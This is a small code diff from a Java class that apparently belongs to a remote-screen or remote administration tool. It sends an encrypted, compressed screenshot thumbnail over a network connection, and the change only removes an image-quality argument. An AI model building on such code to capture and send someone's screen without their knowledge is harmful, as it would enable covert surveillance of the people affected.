@@ -24,7 +24,7 @@ public class Packet85ThumbnailPreview extends AbstractIncomingPacket {
 		
 		BufferedImage screenShot = ImageIO.read(new File(file));
 		screenShot = RemoteScreen.resize(screenShot, 150, 100);
-		byte[] buffer = ImageUtils.encodeImage(screenShot, 1F);
+		byte[] buffer = ImageUtils.encodeImage(screenShot);
 		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
 		Connection.dos.writeInt(buffer.length);
 		Connection.dos.write(buffer);
